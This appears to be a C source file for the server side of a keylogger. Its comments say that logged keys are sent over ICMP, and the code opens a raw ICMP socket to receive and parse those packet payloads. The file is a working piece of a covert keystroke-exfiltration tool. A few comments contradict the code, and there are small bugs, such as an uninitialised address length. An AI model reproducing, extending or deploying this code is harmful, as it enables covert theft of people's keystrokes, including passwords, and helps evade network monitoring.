/*
    this code handles the main server loop


*/

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#include <string.h>
#include "server.h"

int init_remote_connection(server_t *instance) {

#ifdef DEBUG
    DEBUG_LOG("Initiating remote connection with (localhost:%d)",
              instance->options.listen_port);
#endif

    /*
       creating initial socket...

       we will transmit keys logged over ICMP protocol.
       to parse ICMP packets, we must use RAW sockets & filter the packets ourselves :)

       AF_INET          -> remote connection    (for local, use AF_UNIX)
       SOCK_STREAM      -> TCP connection       (for UDP, use SOCK_DGRAM)
       IPPROTO_TCP      -> Specify protocol     (for UDP, use IPPROTO_UDP)

    */
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {

#ifdef DEBUG
        perror("socket");
#endif

        close(sockfd);
        return -1;
    }

    /* items required to bind socket to remote address */
    int is_enabled = 1;
    struct sockaddr_in addr = {.sin_family = AF_INET,
                               .sin_port = htons(instance->options.listen_port),
                               .sin_addr.s_addr = inet_addr(STATIC_IP_ADDR)};

    /* setting socket options to make connection more convenient
    * allowing to reuse ADDR or PORT (useful for testing)
    *  */
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
                   &is_enabled,
                   sizeof(int)) < 0) {

#ifdef DEBUG
        DEBUG_LOG("setsockopt send_key_description: %s", strerror(errno));
#endif

        close(sockfd);
        return -1;
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &is_enabled, sizeof(int)) < 0) {

#ifdef DEBUG
        DEBUG_LOG("setsockopt send_key_description (IP_HDRINCL): %s", strerror(errno));
#endif

        close(sockfd);
        return -1;
    }

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {

#ifdef DEBUG
        DEBUG_LOG("connect: %s", strerror(errno));
#endif

        close(sockfd);
        return -1;
    }

    return sockfd;
}

/* NOTE(djnn): this function's failure triggers exit routine,
 * so ERROR is only returned on critical error */
int net_icmp_recv(const server_t *instance, icmp_msg_t *msg) {

    socklen_t src_addr_size = 0;
    struct sockaddr_in src_addr = {0};
    struct iphdr *ip_addr = NULL;
    struct icmphdr *icmp_header = NULL;

    /* check if we can hold the full message */
    _Static_assert(MTU + sizeof(struct iphdr) + sizeof(struct icmphdr) < ICMP_DATA_LENGTH, "ICMP_DATA_LENGTH is not big enough");

    const int encapsulated_mtu = MTU + sizeof(struct iphdr) + sizeof(struct icmphdr);
    char full_packet[ICMP_DATA_LENGTH] = {0}; /* all values are static ; this is fine */

    /* blocking recvfrom() to retrieve ICMP packet :) */
    ssize_t pktsz = recvfrom(
        instance->sockfd,
        full_packet,
        encapsulated_mtu,
        0,
        (struct sockaddr *)&(src_addr),
        &src_addr_size
        );
    if (pktsz < 0)
        return ERROR;

    /* parse headers */
    ip_addr = (struct iphdr *)full_packet;
    icmp_header = (struct icmphdr *)(full_packet + sizeof(struct iphdr));
    msg->payload_size = (size_t)pktsz - sizeof(struct iphdr) - sizeof(struct icmphdr);

    if (memccpy(
        msg->payload,
        (full_packet + sizeof(struct iphdr) + sizeof(struct icmphdr)),
        0,
        msg->payload_size
        ) == NULL) {
        /* non-critical error. maybe perror() this ? */
        bzero(msg->addr, IP_LENGTH);

        return SUCCESSFUL;
    }

    /* set message type & source ip-addr */
    msg->type = icmp_header->type;
    inet_ntop(AF_INET, &(ip_addr->saddr), msg->addr, INET_ADDRSTRLEN);

    return SUCCESSFUL;
}
